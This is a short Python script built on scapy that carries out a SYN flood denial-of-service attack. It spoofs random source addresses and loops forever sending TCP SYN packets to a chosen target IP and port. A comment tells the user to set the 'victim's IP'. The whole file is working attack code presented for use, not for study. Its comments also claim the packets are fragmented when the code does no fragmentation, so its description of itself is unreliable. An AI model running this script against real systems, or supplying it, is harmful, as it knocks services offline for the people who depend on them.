import scapy.all as scapy
import time
import random

# Function to perform the SYN flood attack with fragmented packets
def syn_flood_attack(target_ip, target_port):
    try:
        # Randomize the source IP and source port to mimic different attackers
        src_ip = f"192.168.1.{random.randint(2, 254)}"
        src_port = random.randint(1024, 65535)

        # Create the SYN packet (fragmented)
        ip = scapy.IP(src=src_ip, dst=target_ip)
        syn = scapy.TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1, 65535))

        # Send fragmented packets
        fragmented_packet = ip / syn
        scapy.send(fragmented_packet, verbose=False)
        print(f"Sent SYN packet from {src_ip}:{src_port} to {target_ip}:{target_port}")
    
    except OSError as e:
        # Handle OSError properly by converting it to a string and printing it
        print(f"Error during SYN flood attack: {str(e)}")
    
    except Exception as e:
        # General exception handling for other unexpected errors
        print(f"An unexpected error occurred: {str(e)}")


# Main function to initiate the attack
def main():
    # Set the target IP and port
    target_ip = "192.168.100.5"  # Change this to your victim's IP
    target_port = 80  # HTTP port (or whatever port you are targeting)

    print("Starting SYN flood attack with fragmented packets...")

    while True:
        syn_flood_attack(target_ip, target_port)
        time.sleep(0.1)  # Add delay to control the attack speed

if __name__ == "__main__":
    main()
